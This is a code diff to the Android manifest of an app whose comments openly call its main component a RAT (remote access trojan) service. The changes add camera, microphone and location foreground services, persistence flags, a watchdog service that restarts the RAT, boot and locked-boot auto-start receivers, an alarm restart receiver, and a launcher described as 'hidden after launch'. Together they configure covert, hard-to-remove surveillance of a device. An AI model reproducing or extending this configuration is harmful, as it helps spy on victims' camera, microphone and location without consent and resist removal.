@@ -8,7 +8,14 @@
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
     
     <!-- 📷 CAMERA PERMISSIONS -->
     <uses-permission android:name="android.permission.CAMERA" />
@@ -43,6 +50,11 @@
     
     <!-- ℹ️ DEVICE INFO PERMISSIONS -->
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    
+    <!-- 🔄 PERSISTENCE PERMISSIONS -->
+    <uses-permission android:name="android.permission.RESTART_PACKAGES" />
+    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
 
     <application
         android:allowBackup="true"
@@ -53,9 +65,10 @@
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
         android:theme="@style/Theme.Fly0Rakoon"
-        android:usesCleartextTraffic="true">
+        android:usesCleartextTraffic="true"
+        android:persistent="true">
         
-        <!-- Main Activity (Launcher) -->
+        <!-- Main Activity (Launcher) - Hidden after launch -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
@@ -68,23 +81,41 @@
             </intent-filter>
         </activity>
         
-        <!-- RAT Background Service -->
+        <!-- RAT Background Service - Main service with all features -->
         <service
             android:name=".RATService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="dataSync" />
+            android:foregroundServiceType="camera|microphone|location|dataSync"
+            android:stopWithTask="false"
+            android:persistent="true" />
         
-        <!-- Boot Receiver (Auto-start on device boot) -->
+        <!-- Watchdog Service - Monitors and restarts RATService -->
+        <service
+            android:name=".WatchdogService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="dataSync"
+            android:stopWithTask="false" />
+        
+        <!-- Boot Receiver - Auto-start on device boot -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
-            android:exported="false">
+            android:exported="false"
+            android:directBootAware="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
             </intent-filter>
         </receiver>
+        
+        <!-- Alarm Receiver - For scheduled restarts -->
+        <receiver
+            android:name=".RestartReceiver"
+            android:enabled="true"
+            android:exported="false" />
         
     </application>
 
